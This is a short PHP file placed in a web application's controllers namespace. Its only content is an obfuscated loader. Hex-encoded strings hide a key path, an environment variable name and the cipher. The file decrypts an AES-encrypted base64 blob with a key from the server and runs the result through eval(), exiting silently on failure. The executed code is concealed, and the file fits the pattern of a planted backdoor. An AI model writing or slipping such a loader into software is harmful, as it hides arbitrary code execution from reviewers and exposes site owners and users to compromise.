<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('q0HmwUZJ8DldI2I4MKT7DA==');

$c=base64_decode(

'pESvZCKKJDd8TRzN93Kyos4HUcl8Idxn/sV/8qbL4hUIkEwN1DmHInu9fajRP5lW77gsTWFRxv+t' .
'Vfq1spKN14tp1P0DCt/8zeKdfn9nybPVAT2NMQ+mkBaw1J2DxNsRFLVVmtAUkrQ6DAcJYSZWHZoq' .
'b7X3bc1kGAuEnJVtzIvagcTUNSza1NyfK6vrLZ8SVGu1tyoJ8n60XLDXXDelhKtfx8MUDHdSGRsz' .
'jdK6NTM='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

